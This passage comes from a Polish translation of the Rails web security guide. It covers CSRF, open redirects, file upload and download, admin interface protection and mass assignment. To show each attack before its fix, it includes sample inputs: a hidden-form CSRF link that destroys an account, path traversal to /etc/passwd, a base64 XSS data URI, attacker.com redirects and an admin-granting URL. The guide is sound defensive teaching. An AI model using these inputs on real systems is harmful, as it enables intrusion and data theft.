  w danych sesji i zniszczy projekt z ID 1. Następnie zwróci stronę, która będzie nieoczekiwanym wynikiem dla przeglądarki, więc nie wyświetli się żaden obrazek.
</p>
</li>
<li>
<p>
Bob nie zauważy ataku&#8201;&#8212;&#8201;ale po kilku dniach stwierdzi, że projekt numer 1 zniknał.
</p>
</li>
</ul></div>
<div class="paragraph"><p>Ważne jest, aby zauważyć, że spreparowany obrazek lub link niekoniecznie musi
znajdować się w domenie, gdzie znajduje się aplikacja - może być w dowolnym miejscu - na forum, blogu lub w mailu.</p></div>
<div class="paragraph"><p>CSRF pojawia się bardzo rzadko w CVE (Common Vulnerabilities and Exposures)&#8201;&#8212;&#8201;mniej niż 0,1% w 2006 r.&#8201;&#8212;&#8201;ale tak naprawdę jest to "śpiący olbrzym"
[Grossman]. Kontrastuje to znacząco z wynikami moich (i innych) zleceń
dotyczących bezpieczeństwa - <span style="background-color: #fffcdb;">CSRF jest istotną kwestią bezpieczeństwa</span>.</p></div>
<h3 id="_sposoby_ochrony_przed_atakiem_typu_csrf">3.1. Sposoby ochrony przed atakiem typu CSRF</h3>
<div class="paragraph"><p>-- <em>Po pierwsze, używaj żądań GET i POST tak, jak jest to zalecane przez W3C.
  Po drugie, używaj tokena zabezpieczającego przy metodach non-GET, żeby
  chronić aplikację przed CSRF</em>.</p></div>
<div class="paragraph"><p>Protokół HTTP przewiduje zasadniczo dwa główne rodzaje żądań - GET i POST (i więcej, ale nie są one obsługiwane przez większość przeglądarek). World Wide Web Consortium (W3C) podaje spis sytuacji, w których stosujemy GET lub POST:</p></div>
<div class="paragraph"><p><strong>Używaj GET jeśli:</strong></p></div>
<div class="ulist"><ul>
<li>
<p>
Interakcja przypomina <span style="background-color: #fffcdb;">zapytanie</span> (np. jeśli jest to bezpieczna operacja taka jak kwerenda, operacja czytania, albo wyszukiwania.
</p>
</li>
</ul></div>
<div class="paragraph"><p><strong>Używaj  POST jeśli:</strong></p></div>
<div class="ulist"><ul>
<li>
<p>
Interakcja przypomina <span style="background-color: #fffcdb;">komendę</span> lub
</p>
</li>
<li>
<p>
Interakcja <span style="background-color: #fffcdb;">powoduje zmianę</span> zasobów w sposób zauważalny dla użytkownika (np. subskrypcja serwisu) lub
</p>
</li>
<li>
<p>
Użytkownik <span style="background-color: #fffcdb;">jest odpowiedzialny za wynik działania</span> interakcji.
</p>
</li>
</ul></div>
<div class="paragraph"><p>Jeśli aplikacja internetowa jest RESTful, możesz również korzystać z dodatkowych  metod HTTP, takich jak PUT lub DELETE. Większość współczesnych przeglądarek internetowych ich nie obsługuje, jednak Railsy wykorzystują ukryte pole <tt>_method</tt>, żeby ominąć tą barierę.</p></div>
<div class="paragraph"><p><span style="background-color: #fffcdb;">Metody <tt>verify</tt> w kontrolerze sprawdza czy konkretne akcje mogą być
wykonywane za pomocą określonego typu żądania</span>. Oto przykład, w którym sprawdzane jest
wykonanie akcji <tt>transfer</tt> przez żądanie typu POST. Jeżeli akcja zostanie wywołana
za pomocą jakiegokolwiek innego typu żądania HTTP, zostanie ona przekierowana
do akcji <tt>list</tt>.</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>verify :method =&gt; :post, :only =&gt; [:transfer], :redirect_to =&gt; {:action =&gt; :list}</tt></pre>
</div></div>
<div class="paragraph"><p>Dzięki tej ostrożności, wyżej opisany atak nie zadziała, ponieważ przeglądarka wysyła żądanie GET dla obrazków, które nie zostanie zaakceptowane przez aplikację internetową.</p></div>
<div class="paragraph"><p>Ale to dopiero pierwszy krok, ponieważ <span style="background-color: #fffcdb;">żądanie POST również może
być wysłane automatycznie</span>. Oto przykład linku, który wyświetli
<tt>www.harmless.com</tt> jako miejsce docelowe w pasku stanu przeglądarki. W
rzeczywistości jednak dynamicznie tworzy nowy formularz, który wysyła
niebezpieczne żądanie POST.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;a</span></span> <span style="color: #009900">href</span><span style="color: #990000">=</span><span style="color: #FF0000">"http://www.harmless.com/"</span> <span style="color: #009900">onclick</span><span style="color: #990000">=</span><span style="color: #FF0000">"</span>
<span style="color: #FF0000">  var f = document.createElement('form');</span>
<span style="color: #FF0000">  f.style.display = 'none';</span>
<span style="color: #FF0000">  this.parentNode.appendChild(f);</span>
<span style="color: #FF0000">  f.method = 'POST';</span>
<span style="color: #FF0000">  f.action = 'http://www.example.com/account/destroy';</span>
<span style="color: #FF0000">  f.submit();</span>
<span style="color: #FF0000">  return false;"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span>To the harmless survey<span style="font-weight: bold"><span style="color: #0000FF">&lt;/a&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Atakujący może też umieścić kod w zdarzeniu onmouseover dla obrazka:</p></div>
<div class="paragraph"><p><tt>&lt;img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." /&gt;</tt></p></div>
<div class="paragraph"><p>Istnieje wiele innych możliwości (w tym Ajax) ataku niezauważalnego dla
ofiary.  <span style="background-color: #fffcdb;">Rozwiązaniem tego problemu może być użycie tokena
zabezpieczającego w żądaniach typu non-GET</span> sprawdzanego po stronie serwera. W
wersjach Railsów 2.0 lub wyższych, jest to jedna linia kodu w kontrolerze aplikacji:</p></div>
<div class="paragraph"><p><tt>protect_from_forgery :secret =&gt; "123456789012345678901234567890..."</tt></p></div>
<div class="paragraph"><p>Spowoduje to automatyczne dołączenie zabezpieczającego tokena, wyliczonego na
podstawie bieżącej sesji i tajnego klucza, we wszystkich formularzach i
żądaniach Ajaxowych generowanych w Railsach. Klucz nie będzie potrzebny, jeśli
używasz CookieStorage jako sposobu przechowywania sesji. Aplikacja wyrzuci
wyjątek <tt>ActionController::InvalidAuthenticityToken</tt> jeśli token nie będzie poprawny.</p></div>
<div class="paragraph"><p>Należy pamiętać, że <span style="background-color: #fffcdb;">atak typu cross-site scripting (XSS) omija wszystkie zabezpieczenia przed atakami typu CSRF</span>. XSS pozwala atakującemu na dostęp do wszystkich elementów na stronie, także może on odczytać token zabezpieczający przed CSRF z formularza lub bezpośrednio wysłać formularz. Więcej informacji o atakach typu XSS znajduje się w dalszej części podręcznika.</p></div>
</div>
<h2 id="_przekierowania_i_pliki">4. Przekierowania i pliki</h2>
<div class="sectionbody">
<div class="paragraph"><p>Inną grupą elementów podatnych na atak są przekierowania i pliki w aplikacjach internetowych.</p></div>
<h3 id="_przekierowania">4.1. Przekierowania</h3>
<div class="paragraph"><p>-- <em>Przekierowanie w aplikacji internetowej to niedoceniane narzędzie ataku:
  atakujący może zarówno wyprowadzić użytkownika na stronę-pułapkę, jak i
  przygotować atak niezależny.</em></p></div>
<div class="paragraph"><p>Każdy przypadek, gdy użytkownik ma możliwość określenia linku (jego części) na
podstawie którego tworzone jest przekierowanie, stanowi prawdopodobne
zagrożenie. Najbardziej oczywisty atak to przekierowanie użytkowników do
fałszywych stron, które wyglądają dokładnie jak oryginalne. Ten atak (typu
phishing) działa poprzez wysłanie zwyczajnie wyglądających linków w wiadomości
e-mail, dodawanie lików do działającej aplikacji poprzez ataki XSS lub
umieszczanie linków do atakowanej aplikacji na innych stron.</p></div>
<div class="paragraph"><p>Nie wygląda to podejrzanie, ponieważ URL zaczyna się jak link do zwyczajnej,
niegroźnej strony internetowej, a URL do strony, z której płynie zagrożenie,
jest ukryty w parametrze przekierowania:
<tt>http://www.example.com/site/redirect?to= www.attacker.com</tt>.
Oto przykład takiej akcji:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">def</span></span> legacy
  redirect_to<span style="color: #990000">(</span>params<span style="color: #990000">.</span>update<span style="color: #990000">(:</span>action<span style="color: #990000">=&gt;</span><span style="color: #FF0000">'main'</span><span style="color: #990000">))</span>
<span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
<div class="paragraph"><p>Będzie ona przekierowywać użytkownika do głównej akcji, jeśli próbował uzyskać
dostęp do akcji <tt>legacy</tt>. Naszym zamiarem było zabezpieczenie parametrów w
adresie URL (tzw. query string - przyp. red.) w akcji <tt>legacy</tt> i przekazanie ich
do głównej akcji. Jednakże może to być wykorzystane przez atakującego, jeśli
zawrze on adres hosta w adresie URL:</p></div>
<div class="paragraph"><p><tt>http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com</tt></p></div>
<div class="paragraph"><p>Jeśli jest on na końcu adresu URL, ciężko go zauważyć a skutkiem będzie
przekierowanie użytkownika do hosta <tt>attacker.com</tt>. Prosta ochrona polega na
<span style="background-color: #fffcdb;">przekazywaniu tylko oczekiwanych parametrów w akcji <tt>legacy</tt></span> (z
wykorzystaniem tzw. białej listy zamiast usuwania nieoczekiwanych parametrów).
<span style="background-color: #fffcdb;">Dlatego każde akcję pozwalającą na przekierowanie do adresu URL, należy sprawdzać
za pomocą białej listy lub z wykorzystaniem wyrażeń regularnych</span>.</p></div>
<h4 id="_niezale_ny_atak_typu_xss">4.1.1. Niezależny atak typu XSS</h4>
<div class="paragraph"><p>Kolejny typ ataku XSS związany z przekierowaniami działa w
przeglądarkach Firefox i Opera przez wykorzystanie protokołu danych. Protokół
ten wyświetla swoją zawartość bezpośrednio w przeglądarce i może mieć dowolną
postać - od kodu HTML lub JavaScript do całego zdjęcia, np:</p></div>
<div class="paragraph"><p><tt>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</tt></p></div>
<div class="paragraph"><p>W tym przykładzie został użyty zakodowany metodą Base64 skrypt JavaScript,
który wyświetla proste okno dialogowe. W przekierowującym adresie URL
atakujący zaszyć taki złośliwy kod. Żeby bronić się przed takimi atakami,
<span style="background-color: #fffcdb;">nie powinieneś pozwalać użytkownikowi na określanie adresu URL (lub
jego części) w przekierowaniach</span>.</p></div>
<h3 id="_wysy_anie_upload_plik_w">4.2. Wysyłanie (upload) plików</h3>
<div class="paragraph"><p>-- <em>Upewnij się, że pliki wysyłane na serwer nie nadpiszą ważnych plików i że są one przetwarzane asynchronicznie.</em></p></div>
<div class="paragraph"><p>Wiele aplikacji internetowych pozwala użytkownikowi na wysyłanie własnych
plików. <span style="background-color: #fffcdb;">Nazwy plików, które wybierze użytkownik zawsze powinny być
filtrowane</span> ponieważ atakujący może użyć złośliwych nazw plików żeby nadpisać
ważne pliki na serwerze. Jeśli przechowujesz wczytane pliki w katalogu
<tt>/var/www/uploads</tt> i jeśli użytkownik wyśle plik o nazwie
<tt>../../../etc/passwd</tt>, może nadpisać któryś z ważnych plików. Oczywiście
interpreter Ruby wymaga odpowiednich praw, żeby to zrobić – kolejny powód,
żeby odpalać serwery aplikacji, serwery baz danych i inne programy jako mniej
uprzywilejowanych użytkowników.</p></div>
<div class="paragraph"><p>Gdy filtrujesz pliki nadesłane przez użytkownika, <span style="background-color: #fffcdb;">nie staraj się
usunąć złośliwych części</span>. Pomyśl o sytuacji, gdy aplikacja internetowa usuwa
wszystkie <tt>../</tt> w nazwie pliku, a atakujący użyje takiej nazwy: <tt>....//</tt> –
rezultat będzie taki: <tt>../</tt>. Najlepszym rozwiązaniem jest podejście zwane
białą listą, dzięki której <span style="background-color: #fffcdb;"> można sprawdzić czy nazwa pliku
zawiera wyłącznie dozwolone znaki</span>. Jest to alternatywa dla podejścia tzw.
czarnej listy, która która zawiera wyłącznie znaki niedozwolone. W przypadku, gdy
nazwa jest niepoprawna odrzuć ją (lub zastąp niedozwolone znaki), ale nie
usuwaj ich. Poniżej przedstawiony jest rozwiązanie wykorzystywane w
<a href="http://github.com/technoweenie/attachment_fu/tree/master">pluginie attachment_fu</a>:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">def</span></span> sanitize_filename<span style="color: #990000">(</span>filename<span style="color: #990000">)</span>
  returning filename<span style="color: #990000">.</span>strip <span style="font-weight: bold"><span style="color: #0000FF">do</span></span> <span style="color: #990000">|</span>name<span style="color: #990000">|</span>
    <span style="font-style: italic"><span style="color: #9A1900"># NOTE: File.basename doesn't work right with Windows paths on Unix</span></span>
    <span style="font-style: italic"><span style="color: #9A1900"># get only the filename, not the whole path</span></span>
    name<span style="color: #990000">.</span>gsub! <span style="color: #FF6600">/^.*(\\|\/)/</span><span style="color: #990000">,</span> <span style="color: #FF0000">''</span>
    <span style="font-style: italic"><span style="color: #9A1900"># Finally, replace all non alphanumeric, underscore</span></span>
    <span style="font-style: italic"><span style="color: #9A1900"># or periods with underscore</span></span>
    name<span style="color: #990000">.</span>gsub! <span style="color: #FF6600">/[^\w\.\-]/</span><span style="color: #990000">,</span> <span style="color: #FF0000">'_'</span>
  <span style="font-weight: bold"><span style="color: #0000FF">end</span></span>
<span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
<div class="paragraph"><p>Istotną niedogodnością synchronicznego przetwarzania plików (jak
ma to miejsce np. w pluginie attachment_fu przy przetwarzaniu obrazków),
jest jego <span style="background-color: #fffcdb;">podatność na ataki typu danial-of-service</span>. Atakujący
może synchronicznie rozpocząć wysyłanie obrazków z wielu komputerów, co
zwiększa obciążenie serwera i może doprowadzić do jego awarii.</p></div>
<div class="paragraph"><p>Najlepszym rozwiązaniem jest <span style="background-color: #fffcdb;">asynchroniczne przetwarzanie plików (w
szczególności obrazków i filmów)</span>: zapisz plik i ustaw harmonogram
przetwarzania żądania w bazie danych. Niezależny proces zajmie się przetwarzaniem plików w tle.</p></div>
<h3 id="_kod_wykonywalny_we_wczytywanych_plikach">4.3. Kod wykonywalny we wczytywanych plikach</h3>
<div class="paragraph"><p>-- <em>Kod źródłowy we wczytywanych plikach może być wykonywany, gdy umieszczony
jest w konkretnych katalogach. Nie należy umieszczać wczytywanych plików
Rails w katalogu <tt>/public</tt>, jeżeli jest to katalog domowy Apache&#8217;a.</em></p></div>
<div class="paragraph"><p>Popularny serwer Apache posiada opcję o nazwie <tt>DocumentRoot</tt>. Jest to katalog
domowy strony internetowej. Wszystko w tym drzewie katalogów będzie
obsługiwane przez serwer WWW. Jeśli istnieją pliki o określonych
rozszerzeniach, kod zostanie wykonany, jeśli przyjdzie określone żądanie (może
to wymagać ustalenia niektórych opcji). Przykładem mogą być pliki PHP i CGI. Teraz pomyśl o sytuacji, gdy atakujący wysyła na serwer plik <tt>file.cgi</tt> zawierający kod, który zostanie wykonany, gdy ktoś pobiera plik.</p></div>
<div class="paragraph"><p><span style="background-color: #fffcdb;">Jeśli <tt>DocumentRoot</tt> w Apache odnosi się do katalogu
<tt>/public</tt> Twojej aplikacji, nie umieszczaj w nim wczytywanych plików,</span>
przechowuj pliki co najmniej jeden poziom niżej.</p></div>
<h3 id="_ci_ganie_plik_w">4.4. Ściąganie plików</h3>
<div class="paragraph"><p>-- <em>Upewnij się, czy użytkownicy nie mogą pobierać dowolnych plików.</em></p></div>
<div class="paragraph"><p>Tak ja to było przy wysyłaniu plików na serwer, musisz filtrować nazwy plików
przy pobieraniu. Metoda <tt>send_file()</tt> wysyła pliki z serwera do klienta. Jeśli
używana jest nazwa pliku wpisywana przez użytkownika bez filtrowania, można pobrać każdy plik:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>send_file<span style="color: #990000">(</span><span style="color: #FF0000">'/var/www/uploads/'</span> <span style="color: #990000">+</span> params<span style="color: #990000">[:</span>filename<span style="color: #990000">])</span></tt></pre></div></div>
<div class="paragraph"><p>Wystarczy podać nazwę pliku, taką jak <tt>../../../etc/passwd</tt> żeby pobrać plik
zawierający zaszyfrowane hasła serwera. Prostym rozwiązaniem jest
<span style="background-color: #fffcdb;">sprawdzenie czy żądany plik znajduje się w tym katalogu, w którym się spodziewasz</span>:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>basename <span style="color: #990000">=</span> File<span style="color: #990000">.</span>expand_path<span style="color: #990000">(</span>File<span style="color: #990000">.</span>join<span style="color: #990000">(</span>File<span style="color: #990000">.</span>dirname<span style="color: #990000">(</span><span style="font-weight: bold"><span style="color: #0000FF">__FILE__</span></span><span style="color: #990000">),</span> <span style="color: #FF0000">'../../files'</span><span style="color: #990000">))</span>
filename <span style="color: #990000">=</span> File<span style="color: #990000">.</span>expand_path<span style="color: #990000">(</span>File<span style="color: #990000">.</span>join<span style="color: #990000">(</span>basename<span style="color: #990000">,</span> <span style="color: #009900">@file</span><span style="color: #990000">.</span>public_filename<span style="color: #990000">))</span>
<span style="font-weight: bold"><span style="color: #0000FF">raise</span></span> <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> basename <span style="color: #990000">=!</span>
     File<span style="color: #990000">.</span>expand_path<span style="color: #990000">(</span>File<span style="color: #990000">.</span>join<span style="color: #990000">(</span>File<span style="color: #990000">.</span>dirname<span style="color: #990000">(</span>filename<span style="color: #990000">),</span> <span style="color: #FF0000">'../../../'</span><span style="color: #990000">))</span>
send_file filename<span style="color: #990000">,</span> <span style="color: #990000">:</span>disposition <span style="color: #990000">=&gt;</span> <span style="color: #FF0000">'inline'</span></tt></pre></div></div>
<div class="paragraph"><p>Inny (dodatkowy) sposób to przechowywanie nazw plików w bazie danych i
nazywanie plików na dysku według identyfikatorów w bazie danych. Jest to
również dobry sposób, żeby uniknąć problemu wykonywalnego kodu plikach
wysyłanych na serwer. Wtyczka attachment_fu działa w podobny sposób.</p></div>
</div>
<h2 id="_ochrona_intranetu_i_panelu_administratora">5. Ochrona intranetu i panelu administratora</h2>
<div class="sectionbody">
<div class="paragraph"><p>-- <em>Intranet i interfejsy administracyjne są popularnymi celami ataku, ponieważ umożliwiają one uprzywilejowany dostęp.
   Chociaż powinny być obwarowane dodatkowymi zabezpieczeniami zazwyczaj
   rzeczywistość wygląda inaczej.</em></p></div>
<div class="paragraph"><p>W 2007 roku pojawił się pierwszy, wykonany na zamówienie
<a href="http://www.symantec.com/enterprise/security_response/weblog/2007/08/a_monster_trojan.html">Trojan</a>,
który ukradł informacje z intranetu, mianowicie "Monster dla pracodawców"
strony internetowej Monster.com służącej do rekrutacji online. Jak dotąd,
indywidualnie stworzone Trojany są bardzo rzadkie, a ryzyko ich użycia przeciw
aplikacjom jest dość niskie, ale istnieje taka możliwość, a przykład ten
pokazuje również jak istotne jest bezpieczeństwo komputera użytkownika. Jednak
najwyższe zagrożenie dla Intranetu i paneli administracyjnych pochodzi z XSS i CSRF.  </p></div>
<div class="paragraph"><p><strong>XSS</strong>  Jeśli aplikacja wyświetla w intranecie dane wprowadzone przez złośliwego użytkownika
z ekstranetu, będzie ona podatny na XSS. Nazwy użytkowników, komentarze,
raporty o spamie, adresy w zamówieniach – to zaledwie kilka przykładowych
elementów, które można zaatakować przez XSS.</p></div>
<div class="paragraph"><p>Nawet jedno miejsce w interfejsie administratora lub intranecie, w którym dane
wejściowe nie zostały sprawdzone, sprawia, że cała aplikacja staje się
wrażliwa na atak. Atakującemu umożliwia to kradzież uprzywilejowanych cookies
administratora, wstawianie kodu IFRAME, żeby wykraść hasła administratora lub
zainstalować złośliwe oprogramowanie poprzez luki w zabezpieczeniach przeglądarki w celach przejęcia kontroli nad komputerem administratora.</p></div>
<div class="paragraph"><p>Zapoznaj się z sekcją o atakach i ochronie przed XSS. <span style="background-color: #fffcdb;">Zalecane jest korzystanie z wtyczki SafeErb</span> również w intranecie lub interfejsie administratora.</p></div>
<div class="paragraph"><p><strong>CSRF</strong>  Cross-Site Reference Forgery (CSRF) jest bardzo groźną metodą ataku. Pozwala ona atakującemu zrobić dokładnie to samo, co administrator lub użytkownik intranetu. Wcześniej dowiedziałeś się jak działa CSRF, a teraz czas na kilka przykładów:</p></div>
<div class="paragraph"><p>Przykład z życia wzięty to
<a href="http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_ wild.html">rekonfiguracja
routera przez CSRF</a>. Atakujący rozesłał złośliwe maile z CSRF do meksykańskich
użytkowników. E-mail informował o e-kartce czekającej na użytkowników, ale
zawierał również Tag obrazka, które poprzez żądanie http-GET miał
rekonfigurować router użytkownika (dla jednego z popularnych modeli w
Meksyku). Wywołanie zmieniało ustawienia DNS w ten sposób, że żądania wysyłane
do Meksykańskiego banku były mapowane do witryny atakującego. Każdy, kto
odwiedził witrynę banku za pośrednictwem tego routera trafiał do fałszywej
strony atakującego, a jego dane uwierzytelniające zostały skradzione.</p></div>
<div class="paragraph"><p>Inny przykład ataku polegał na zmianie e-maila i hasła do Google Adsense za
pomocą <a href="http://www.0x000000.com/index.php?i=213&amp;bin=11010101">CSRF</a>. Jeżeli
ofiara była zalogowana do interfejsu administratora programu Google Adsense i
przeglądała dział kampanii reklamowych, atakujący mógł zmienić jej dane
uwierzytelniające.  </p></div>
<div class="paragraph"><p>Kolejnym popularnym atakiem jest spamowanie twojej strony, bloga lub forum, w
celu rozprzestrzenienia złośliwego XSS. Oczywiście, osoba atakująca musi znać
strukturę URL, ale większość tych wykorzystywanych przez Railsy jest dość
prosta lub łatwa do odgadnięcia, jeśli jest to jeden z open sourcowych
interfejsów administracyjnych. Atakujący może próbować nawet 1000
kombinacji (składników URLa - przyp. red.) poprzez złośliwe tagi IMG.
Informacje o <span style="background-color: #fffcdb;">ochronie przeciwko CSRF w interfejsach administracyjnych i aplikacjach intranetowych, znajdują się w dziale o ochronie przeciw CSRF</span>.</p></div>
<h3 id="_dodatkowe_rodki_ostro_no_ci">5.1. Dodatkowe środki ostrożności</h3>
<div class="paragraph"><p>Przeciętny interfejs administracyjny działa tak: jest umieszczony w
<tt>www.example.com/admin</tt>, może być dostępny tylko wtedy, gdy flaga
administratora jest ustawiona w modelu użytkownika, wyświetla dane wprowadzone
przez użytkownika i pozwala administratorowi usuwać/dodawać/edytować wszystko, na co ma ochotę. Oto kilka słów na ten temat:</p></div>
<div class="ulist"><ul>
<li>
<p>
Bardzo ważne jest, <span style="background-color: #fffcdb;">żeby myśleć o najgorszym przypadku</span>: Co
  zrobić, jeśli ktoś naprawdę przejmie moje pliki cookie lub dane
  uwierzytelniające użytkownika. Można <span style="background-color: #fffcdb;">wprowadzić role</span> w
  interfejsie administratora, aby ograniczyć możliwości atakującego. Można też
  wprowadzić <span style="background-color: #fffcdb;">odrębny login i hasło</span> do interfejsu administratora,
  inne niż te używane do publicznej części aplikacji albo <span style="background-color: #fffcdb;">specjalne hasło do bardzo poważnych działań</span>?
</p>
</li>
<li>
<p>
Czy admin naprawdę ma dostęp do interfejsu z każdego miejsca na świecie?
  Pomyśl o <span style="background-color: #fffcdb;">ograniczeniu logowania do kilka adresów IP</span>. Zbadaj
  <tt>request.remote_ip</tt>, aby poznać adres IP użytkowników. Nie gwarantuje to
  stuprocentowej ochrony, ale na pewno stanowi dużą przeszkodę. Pamiętaj
  jednak, że ktoś może używać serwera Proxy.
</p>
</li>
<li>
<p>
<span style="background-color: #fffcdb;">Umieść specjalny interfejs administracyjny w sub-domenie</span> takiej
  jak <tt>admin.application.com</tt> i stwórz z niej odrębną aplikację, z odrębnym
  zarządzaniem użytkownikami. To sprawia, że kradzież cookie administratora ze
  zwykłej domeny <tt>www.application.com</tt> jest niemożliwa. Wynika to z konceptu
  "same origin Policy" w przeglądarce: skrypt (XSS) wstawiony na stronie
  <tt>www.application.com</tt> nie może odczytać cookie z <tt>admin.application.com</tt> i vice versa.
</p>
</li>
</ul></div>
</div>
<h2 id="_masowe_przypisanie">6. Masowe przypisanie</h2>
<div class="sectionbody">
<div class="paragraph"><p>-- <em>Bez zachowania środków ostrożności <tt>Model.new(params[:model])</tt> pozwala
  atakującemu na ustawienie wartości dowolnej kolumny w bazie danych.</em></p></div>
<div class="paragraph"><p>Masowe przypisanie może stać się problemem, ponieważ umożliwia atakującemu
ustawienie atrybutów każdego modelu poprzez manipulację tablicą asocjacyjną
przekazywaną do metody <tt>new()</tt> modelu:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">def</span></span> signup
  params<span style="color: #990000">[:</span>user<span style="color: #990000">]</span> <span style="font-style: italic"><span style="color: #9A1900">#=&gt; {:name =&gt; “ow3ned”, :admin =&gt; true}</span></span>
  <span style="color: #009900">@user</span> <span style="color: #990000">=</span> User<span style="color: #990000">.</span>new<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>user<span style="color: #990000">])</span>
<span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
<div class="paragraph"><p>Masowe przypisanie może zaoszczędzić ciężkiej pracy, ponieważ nie musisz
ustawiać wszystkich wartości indywidualnie. Wystarczy przekazać tablicę
asocjacyjną do metody <tt>new()</tt> lub przekazać do metody <tt>attributes=(attributes)</tt> tablicę asocjacyjną, aby
ustawić atrybuty modelu zgodnie z jej zawartością. Problemem jest, że jest to
często używane w połączeniu z tablicą asocjacyjną parametrów (<tt>params</tt>) w
kontrolerze, która może być zmodyfikowana przez atakującego. Może to zrobić poprzez zmianę adresu URL w taki sposób:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>http://www.example.com/user/signup?user[name]=ow3ned&amp;user[admin]=1</tt></pre>
</div></div>
<div class="paragraph"><p>Pozwoli to ustalić następujące parametry w kontrolerze:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>params<span style="color: #990000">[:</span>user<span style="color: #990000">]</span> <span style="font-style: italic"><span style="color: #9A1900">#=&gt; {:name =&gt; “ow3ned”, :admin =&gt; true}</span></span></tt></pre></div></div>
<div class="paragraph"><p>Więc tworząc nowego użytkownika za pomocą masowego przypisania, zbyt łatwo można stać się administratorem.</p></div>
<h3 id="_sposoby_ochrony">6.1. Sposoby ochrony</h3>
<div class="paragraph"><p>Aby tego uniknąć Railsy oferują dwie klasowe metody w klasie <tt>ActiveRecord</tt> do
kontroli dostępu do atrybutów. Metoda <tt>attr_protected</tt> stanowi listę atrybutów, które nie będą dostępne dla masowego przypisania. Na przykład:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>attr_protected <span style="color: #990000">:</span>admin</tt></pre></div></div>
<div class="paragraph"><p>O wiele lepsze rozwiązanie, kierujące się zasadą białej listy to
<span style="background-color: #fffcdb;">metoda <tt>attr_accessible</tt></span>. Jest to dokładne przeciwieństwo
<tt>attr_protected</tt>, ponieważ <span style="background-color: #fffcdb;">dotyczy listy atrybutów, które będą
dostępne</span>. Wszystkie inne atrybuty będą chronione. W ten sposób nigdy nie
zapomnisz o ochronie nowych atrybutów podczas ich dodawania w trakcie rozwoju
aplikacji. Oto przykład:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>attr_accessible <span style="color: #990000">:</span>name</tt></pre></div></div>
<div class="paragraph"><p>Jeśli chcesz ustawić atrybut chroniony, będziesz musiał przypisać go indywidualnie:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>params<span style="color: #990000">[:</span>user<span style="color: #990000">]</span> <span style="font-style: italic"><span style="color: #9A1900">#=&gt; {:name =&gt; "ow3ned", :admin =&gt; true}</span></span>
<span style="color: #009900">@user</span> <span style="color: #990000">=</span> User<span style="color: #990000">.</span>new<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>user<span style="color: #990000">])</span>
<span style="color: #009900">@user</span><span style="color: #990000">.</span>admin <span style="font-style: italic"><span style="color: #9A1900">#=&gt; false # not mass-assigned</span></span>
<span style="color: #009900">@user</span><span style="color: #990000">.</span>admin <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #0000FF">true</span></span>
<span style="color: #009900">@user</span><span style="color: #990000">.</span>admin <span style="font-style: italic"><span style="color: #9A1900">#=&gt; true</span></span></tt></pre></div></div>
</div>
<h2 id="_zarz_dzanie_u_ytkownikami">7. Zarządzanie użytkownikami</h2>
<div class="sectionbody">
<div class="paragraph"><p>-- <em>Prawie każda aplikacja internetowa ma do czynienia z uwierzytelnianiem i autoryzacją. Zamiast kroczenia własną drogą, wskazane jest stosowanie typowych wtyczek (pluginów). Ale ważne jest, aby je aktualizować. Kilka dodatkowych środków ostrożności sprawi, że twoja aplikacja będzie jeszcze bezpieczniejsza.</em></p></div>
<div class="paragraph"><p>Istnieje kilka wtyczek obsługujących uwierzytelnianie i autoryzację, dostępnych w Railsach. Te lepsze zapisują tylko zaszyfrowane hasła, a nie te czysto tekstowe. Najbardziej popularną wtyczką jest <span style="background-color: #fffcdb;">restful_authentication,</span> która chroni również przed atakami typu session fixation. Jednak wcześniejsze wersje w niektórych okolicznościach dopuszczały do logowanie bez nazwy użytkownika i hasła.</p></div>
